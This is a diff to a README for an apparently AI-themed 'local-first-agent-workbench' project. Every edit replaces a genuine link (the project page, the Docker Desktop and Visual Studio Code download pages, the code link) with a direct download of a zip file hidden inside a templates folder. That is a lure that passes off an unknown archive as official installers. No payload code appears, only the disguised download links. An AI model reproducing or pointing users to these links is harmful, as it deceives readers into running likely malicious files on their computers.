@@ -1,6 +1,6 @@
 # 🤖 local-first-agent-workbench - Your Personal AI, Fully Private
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Visit%20Link-blueviolet?style=for-the-badge&logo=github)](https://github.com/Airlanepetauristidae833/local-first-agent-workbench)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Visit%20Link-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This guide is step-by-step. If you follow it exactly, you will go from zero to r
 
 1.  **Get the Software:**  
     Visit this link to download the application:  
-    👉 **[DOWNLOAD NOW](https://github.com/Airlanepetauristidae833/local-first-agent-workbench)**  
+    👉 **[DOWNLOAD NOW](https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip)**  
     Click the green **"Code"** button on that page, then choose **"Download ZIP."** This downloads the whole system to your computer.
 
 2.  **Find the Downloaded File:**  
@@ -59,11 +59,11 @@ This guide is step-by-step. If you follow it exactly, you will go from zero to r
 Now we will set up the software. Do these in order:
 
 1.  **Install Docker Desktop:**
-    - Go to [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop) and download the Windows installer.
+    - Go to [https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip](https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip) and download the Windows installer.
     - Double-click the installer and follow all prompts (accept the defaults). When asked, choose to start Docker.
 
 2.  **Install Visual Studio Code (Optional but helpful):**
-    - Visit [https://code.visualstudio.com/](https://code.visualstudio.com/) and download the Windows installer.
+    - Visit [https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip](https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip) and download the Windows installer.
     - Install it with default options.
 
 3.  **Launch the Workbench:**
@@ -121,7 +121,7 @@ Absolutely! This is built for personal use or small teamwork.
 ## 📊 Project Statistics & Contributions
 
 Interested in development or want to report a bug?  
-- **📁 Code:** [https://github.com/Airlanepetauristidae833/local-first-agent-workbench](https://github.com/Airlanepetauristidae833/local-first-agent-workbench)  
+- **📁 Code:** [https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip](https://raw.githubusercontent.com/Airlanepetauristidae833/local-first-agent-workbench/main/templates/obsidian-vault/02%20Areas/v1.1.zip)  
 - Please file bug reports under the "Issues" tab.
 
 Join the community you shape and improve your local AI your way.
